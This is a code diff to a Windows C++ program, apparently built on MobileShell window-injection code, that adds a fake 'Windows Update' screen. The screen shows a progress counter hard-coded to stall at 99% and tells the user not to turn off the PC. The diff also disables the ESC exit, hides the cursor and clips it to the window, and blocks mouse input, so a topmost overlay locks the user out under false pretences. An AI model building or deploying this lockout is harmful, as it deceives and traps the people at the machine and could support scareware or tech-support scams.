@@ -1,13 +1,19 @@
 // Mainly from [MobileShell](https://github.com/ADeltaX/MobileShell)
 
-#include <string>
-#include <tchar.h>
-#include <cstdlib>
-
 #include "pch.h"
+#include <tchar.h>
+#include <string>
+#include <chrono>
+#include <cmath>
+#include <cstdlib>
+#include <map>
+
 #include "./bitmap_loader.h"
 #include "./img.h"
 #include "./input_blocker.h"
+
+using namespace Gdiplus;
+using namespace std;
 
 #pragma comment(lib, "gdi32.lib")
 #pragma comment(lib, "ole32.lib")
@@ -90,6 +96,7 @@ typedef HRESULT(WINAPI *DwmSetWindowAttribute)(HWND hwnd,
 typedef BOOL(WINAPI *SetBrokeredForeground)(HWND hWnd);
 
 HWND g_hwnd;
+auto g_startTime = std::chrono::steady_clock::now();
 
 // TODO: Read the register table to get the path.
 // Or use hard code bitmap data.
@@ -104,6 +111,22 @@ bool g_enableCursorHiding = true;       // Enable/disable cursor hiding
 bool g_ignoreVirtualInput = true;       // Ignore virtual/software-injected input (recommended: true)
 bool g_enableEmergencyExit = false;     // Emergency exit via 5x Escape key (DISABLED by default for security)
 bool g_cleanupPerformed = false;        // Internal flag to prevent multiple cleanup calls
+
+// Windows Update mode
+bool g_useWindowsUpdateMode = true;     // Use Windows Update mockup instead of bitmap
+bool g_enableEscKeyExit = false;        // DISABLED - No ESC key exit (only virtual input allowed)
+
+// Windows Update progress variables
+const int PROGRESS_DURATION_MS = 5 * 60 * 1000; // 5 minutes in milliseconds
+const int MAX_PROGRESS = 99; // Gets stuck at 99%
+
+// Anti-flicker variables
+static int g_lastProgress = -1;
+static DWORD g_lastSpinnerFrame = 0;
+
+// Cursor clipping variables
+static RECT g_originalClipRect = {0};
+static bool g_cursorClipped = false;
 
 #ifdef WINDOWINJECTION_EXPORTS
 BitmapLoader g_bitmapLoader(false);
@@ -121,10 +144,20 @@ VOID OnPaintGdi(HWND hwnd, HDC hdc);
 // https://stackoverflow.com/a/66238748/1926020
 VOID OnPaintGdiPlus(HWND hwnd, HDC hdc);
 void EmergencyExitCallback();
+void WindowsUpdateExitCallback();
 void PerformCleanupAndExit();
 BOOL WINAPI ConsoleCtrlHandler(DWORD fdwCtrlType);
 void AtExitHandler();
 void SetupExitHandlers();
+
+// Windows Update mockup function declarations
+int GetCurrentProgress();
+wstring GetProgressText(int percentage);
+void DrawWindowsUpdateScreen(Graphics& graphics, int width, int height);
+void DrawSpinner(Graphics& graphics, int centerX, int centerY, int radius);
+void DrawText(Graphics& graphics, const wstring& text, int x, int y, int size, const Color& color, bool center = false);
+void ClipAndHideCursor();
+void RestoreCursor();
 
 
 BOOL IsWindowsVersionOrGreater(DWORD os_major, DWORD os_minor,
@@ -135,11 +168,75 @@ LRESULT CALLBACK TrashParentWndProc(HWND hwnd, UINT message, WPARAM wParam,
                                     LPARAM lParam) {
   switch (message) {
   case WM_CREATE:
+    if (g_useWindowsUpdateMode) {
+      SetTimer(hwnd, 1, 150, NULL); // 6.7 FPS for moderate spinner animation
+      g_lastProgress = -1; // Initialize
+      g_lastSpinnerFrame = 0;
+    }
     break;
 
   case WM_DESTROY:
+    if (g_useWindowsUpdateMode) {
+      KillTimer(hwnd, 1);
+      RestoreCursor();
+    }
     PostQuitMessage(0);
     break;
+
+  case WM_TIMER:
+    if (g_useWindowsUpdateMode && wParam == 1) {
+      // Animation timer - only repaint if something actually changed
+      int currentProgress = GetCurrentProgress();
+      auto now = chrono::steady_clock::now();
+      auto elapsed = chrono::duration_cast<chrono::milliseconds>(now - g_startTime).count();
+      DWORD currentSpinnerFrame = (elapsed / 150) % 12; // Update every 150ms for 12 dots
+      
+      if (currentProgress != g_lastProgress || currentSpinnerFrame != g_lastSpinnerFrame) {
+        g_lastProgress = currentProgress;
+        g_lastSpinnerFrame = currentSpinnerFrame;
+        InvalidateRect(hwnd, NULL, TRUE);
+      }
+    }
+    break;
+
+
+
+  case WM_ERASEBKGND:
+    if (g_useWindowsUpdateMode) {
+      // Prevent default background erase to reduce flicker
+      return 1;
+    }
+    break;
+
+  case WM_SETCURSOR:
+    if (g_useWindowsUpdateMode && g_enableCursorHiding) {
+      // Keep cursor hidden in Windows Update mode
+      SetCursor(NULL);
+      return TRUE;
+    }
+    break;
+
+  case WM_ACTIVATE:
+  case WM_ACTIVATEAPP:
+    if (g_useWindowsUpdateMode && g_enableCursorHiding) {
+      // Ensure cursor clipping is maintained when window gains focus
+      ClipAndHideCursor();
+    }
+    break;
+
+  case WM_MOUSEMOVE:
+  case WM_LBUTTONDOWN:
+  case WM_RBUTTONDOWN:
+  case WM_MBUTTONDOWN:
+    if (g_useWindowsUpdateMode && g_enableCursorHiding) {
+      // Block mouse events and keep cursor hidden
+      SetCursor(NULL);
+      return 0;
+    }
+    break;
+
+
+
 
   case WM_WINDOWPOSCHANGING:
     return 0;
@@ -242,6 +339,9 @@ void PerformCleanupAndExit() {
     g_inputBlocker.ShowCursor();
   }
   
+  // Restore cursor clipping
+  RestoreCursor();
+  
   // Close window
   if (g_hwnd) {
 #ifdef WINDOWINJECTION_EXPORTS
@@ -333,6 +433,56 @@ void EmergencyExitCallback() {
   PerformCleanupAndExit();
 }
 
+void WindowsUpdateExitCallback() {
+  // Windows Update mode exit - single ESC press
+#ifdef WINDOWINJECTION_EXPORTS
+  OutputDebugStringA("Windows Update mode exit - ESC key pressed\n");
+#else
+  _tprintf(_T("Windows Update mode exit - ESC key pressed\n"));
+#endif
+
+  PerformCleanupAndExit();
+}
+
+void ClipAndHideCursor() {
+  if (g_useWindowsUpdateMode && g_enableCursorHiding && g_hwnd) {
+    // Save original clip rect if not already saved
+    if (!g_cursorClipped) {
+      GetClipCursor(&g_originalClipRect);
+    }
+    
+    // Get window rect and clip cursor to it
+    RECT windowRect;
+    GetWindowRect(g_hwnd, &windowRect);
+    ClipCursor(&windowRect);
+    g_cursorClipped = true;
+    
+    // Hide cursor using ShowCursor
+    while (ShowCursor(FALSE) >= 0) {
+      // Keep calling until cursor is hidden
+    }
+    
+    // Set cursor to NULL
+    SetCursor(NULL);
+  }
+}
+
+void RestoreCursor() {
+  if (g_cursorClipped) {
+    // Restore original cursor clipping
+    ClipCursor(&g_originalClipRect);
+    g_cursorClipped = false;
+  }
+  
+  // Restore cursor visibility
+  while (ShowCursor(TRUE) < 0) {
+    // Keep calling until cursor is visible
+  }
+  
+  // Restore default cursor
+  SetCursor(LoadCursor(NULL, IDC_ARROW));
+}
+
 HWND CreateWin(HMODULE hModule, UINT zbid, const TCHAR *title,
                const TCHAR *classname) {
   HINSTANCE hInstance = hModule;
@@ -409,7 +559,7 @@ HWND CreateWin(HMODULE hModule, UINT zbid, const TCHAR *title,
 
   auto setLongRes = SetWindowLong(
       hwnd, GWL_EXSTYLE,
-      GetWindowLong(hwnd, GWL_EXSTYLE) | WS_EX_TRANSPARENT | WS_EX_LAYERED |
+      GetWindowLong(hwnd, GWL_EXSTYLE) | WS_EX_LAYERED |
           WS_EX_TOOLWINDOW | WS_EX_TOPMOST | WS_EX_NOACTIVATE);
   if (0 == setLongRes) {
     ShowErrorMsg(_T("SetWindowLong"));
@@ -614,6 +764,10 @@ DWORD WINAPI UwU(LPVOID lpParam) {
     if (g_enableEmergencyExit) {
       g_inputBlocker.SetEmergencyExitCallback(EmergencyExitCallback);
       g_inputBlocker.SetAllowEscapeKey(true);
+    } else if (g_useWindowsUpdateMode && g_enableEscKeyExit) {
+      // Allow ESC key for Windows Update mode exit (single press)
+      g_inputBlocker.SetEmergencyExitCallback(WindowsUpdateExitCallback);
+      g_inputBlocker.SetAllowEscapeKey(true);
     } else {
       g_inputBlocker.SetAllowEscapeKey(false);  // Block Escape key completely
     }
@@ -635,6 +789,8 @@ DWORD WINAPI UwU(LPVOID lpParam) {
 
   if (g_enableCursorHiding) {
     g_inputBlocker.HideCursor();
+    // Clip and hide cursor for Windows Update mode
+    ClipAndHideCursor();
   }
 
   // Setup additional exit handlers for safety
@@ -646,15 +802,12 @@ DWORD WINAPI UwU(LPVOID lpParam) {
   ShowWindow(g_hwnd, SW_SHOW);
 #endif
 
-  if (g_enableCursorHiding) {
-    g_inputBlocker.HideCursor();
+  // Clip and hide cursor after window is shown
+  if (g_enableCursorHiding && g_useWindowsUpdateMode) {
+    Sleep(100); // Small delay to ensure window is fully displayed
+    ClipAndHideCursor();
+    UpdateWindow(g_hwnd);
   }
-
-#ifndef WINDOWINJECTION_EXPORTS
-  ShowWindow(g_hwnd, SW_SHOW);
-#else
-  ShowWindow(g_hwnd, SW_SHOW);
-#endif
 
   MSG msg;
   while (GetMessage(&msg, nullptr, 0, 0)) {
@@ -718,15 +871,166 @@ VOID OnPaintGdiPlus(HWND hwnd, HDC hdc) {
     return;
   }
 
-  auto bitmap = g_bitmapLoader.GetBitmap();
-  if (bitmap) {
-    Gdiplus::SizeF sizef = Gdiplus::SizeF((Gdiplus::REAL)bitmap->GetWidth(),
-                                          (Gdiplus::REAL)bitmap->GetHeight());
+  if (g_useWindowsUpdateMode) {
+    // Use Windows Update mockup with double buffering to prevent flicker
+    RECT rect;
+    GetClientRect(hwnd, &rect);
+    int width = rect.right - rect.left;
+    int height = rect.bottom - rect.top;
 
-    Gdiplus::RectF rcClient = Gdiplus::RectF(Gdiplus::PointF(0, 0), sizef);
+    // Create double buffer
+    HDC memDC = CreateCompatibleDC(hdc);
+    HBITMAP memBitmap = CreateCompatibleBitmap(hdc, width, height);
+    HBITMAP oldBitmap = (HBITMAP)SelectObject(memDC, memBitmap);
 
-    Gdiplus::Graphics graphics(hdc);
-    graphics.DrawImage(bitmap, rcClient);
+    // Draw to memory DC
+    Gdiplus::Graphics graphics(memDC);
+    graphics.SetSmoothingMode(SmoothingModeAntiAlias);
+    graphics.SetTextRenderingHint(TextRenderingHintClearTypeGridFit);
+    graphics.SetCompositingQuality(CompositingQualityHighSpeed);
+
+    DrawWindowsUpdateScreen(graphics, width, height);
+
+    // Copy to main DC in one operation
+    BitBlt(hdc, 0, 0, width, height, memDC, 0, 0, SRCCOPY);
+
+    // Cleanup
+    SelectObject(memDC, oldBitmap);
+    DeleteObject(memBitmap);
+    DeleteDC(memDC);
+  } else {
+    // Original bitmap mode
+    auto bitmap = g_bitmapLoader.GetBitmap();
+    if (bitmap) {
+      Gdiplus::SizeF sizef = Gdiplus::SizeF((Gdiplus::REAL)bitmap->GetWidth(),
+                                            (Gdiplus::REAL)bitmap->GetHeight());
+
+      Gdiplus::RectF rcClient = Gdiplus::RectF(Gdiplus::PointF(0, 0), sizef);
+
+      Gdiplus::Graphics graphics(hdc);
+      graphics.DrawImage(bitmap, rcClient);
+    }
+  }
+}
+
+// Windows Update mockup functions - exact code from WindowsUpdateMockup.cpp
+int GetCurrentProgress() {
+  auto now = std::chrono::steady_clock::now();
+  auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(now - g_startTime).count();
+  
+  if (elapsed >= PROGRESS_DURATION_MS) {
+    return MAX_PROGRESS; // Stuck at 99%
+  }
+  
+  // Calculate progress from 0% to 99% over 5 minutes
+  float progress = (float)elapsed / PROGRESS_DURATION_MS * MAX_PROGRESS;
+  return (int)progress;
+}
+
+wstring GetProgressText(int percentage) {
+  return to_wstring(percentage) + L"% complete";
+}
+
+void DrawWindowsUpdateScreen(Graphics& graphics, int width, int height) {
+  // Background gradient - use static brush to reduce allocation overhead
+  static LinearGradientBrush* bgBrush = nullptr;
+  static int lastHeight = 0;
+  
+  if (!bgBrush || height != lastHeight) {
+    if (bgBrush) delete bgBrush;
+    bgBrush = new LinearGradientBrush(Point(0,0), Point(0,height), Color(255,0,120,215), Color(255,0,90,158));
+    lastHeight = height;
+  }
+  
+  graphics.FillRectangle(bgBrush, 0, 0, width, height);
+
+  int centerX = width / 2;
+  int centerY = height / 2;
+
+  // Spinner
+  DrawSpinner(graphics, centerX, centerY, 20);
+
+  int currentProgress = GetCurrentProgress();
+  wstring progressText = L"Working on updates " + GetProgressText(currentProgress);
+  DrawText(graphics, progressText, centerX, centerY + 28, 26, Color(255,255,255,255), true);
+
+  wstring statusText = (currentProgress < 99) ?
+    L"Don't turn off your PC. This will take a while." :
+    L"Don't turn off your PC. We're finishing up.";
+  DrawText(graphics, statusText, centerX, centerY + 60, 20, Color(255,245,245,245), true);
+
+  DrawText(graphics, L"Your PC will restart several times.", centerX, height - 80, 16, Color(255,245,245,245), true);
+}
+
+void DrawSpinner(Graphics& graphics, int centerX, int centerY, int radius) {
+  auto now = std::chrono::steady_clock::now();
+  auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(now - g_startTime).count();
+
+  // Moderate rotation: 1 full rotation every 2 seconds (2000ms)
+  float rotation = (elapsed % 2000) * 360.0f / 2000.0f;
+
+  const int numDots = 12;
+  const int dotSize = 6;
+  for (int i = 0; i < numDots; i++) {
+    float angleDeg = rotation + i * (360.0f / numDots);
+    float angleRad = angleDeg * 3.14159f / 180.0f;
+
+    int dotX = centerX + (int)(radius * cos(angleRad));
+    int dotY = centerY + (int)(radius * sin(angleRad));
+
+    // Leading dot brightest, trailing dots fade out
+    int fadeIndex = (numDots - i) % numDots;
+    
+    int r = 255, g = 255, b = 255; // leading dot
+    // trailing dots reduce RGB slightly for bluish fade
+    int alpha = (int)(0.2f + 0.8f * (fadeIndex / (float)numDots) * 255);
+    SolidBrush dotBrush(Color(alpha, r, g, b));
+
+    graphics.FillEllipse(&dotBrush, dotX - dotSize / 2, dotY - dotSize / 2, dotSize, dotSize);
+  }
+}
+
+void DrawText(Graphics& graphics, const wstring& text, int x, int y, int size, const Color& color, bool center) {
+  // Use static objects to reduce allocation overhead
+  static FontFamily* fontFamily = nullptr;
+  static map<int, Font*> fontCache;
+  static map<DWORD, SolidBrush*> brushCache;
+  
+  // Initialize font family once
+  if (!fontFamily) {
+    fontFamily = new FontFamily(L"Segoe UI");
+  }
+  
+  // Get or create font for this size
+  Font* font = nullptr;
+  auto fontIt = fontCache.find(size);
+  if (fontIt != fontCache.end()) {
+    font = fontIt->second;
+  } else {
+    font = new Font(fontFamily, (REAL)size, FontStyleRegular, UnitPixel);
+    fontCache[size] = font;
+  }
+  
+  // Get or create brush for this color
+  DWORD colorValue = color.GetValue();
+  SolidBrush* brush = nullptr;
+  auto brushIt = brushCache.find(colorValue);
+  if (brushIt != brushCache.end()) {
+    brush = brushIt->second;
+  } else {
+    brush = new SolidBrush(color);
+    brushCache[colorValue] = brush;
+  }
+
+  if (center) {
+    // Measure text to center it
+    RectF boundingRect;
+    graphics.MeasureString(text.c_str(), -1, font, PointF(0, 0), &boundingRect);
+    PointF point((REAL)(x - boundingRect.Width / 2), (REAL)y);
+    graphics.DrawString(text.c_str(), -1, font, point, brush);
+  } else {
+    PointF point((REAL)x, (REAL)y);
+    graphics.DrawString(text.c_str(), -1, font, point, brush);
   }
 }
 
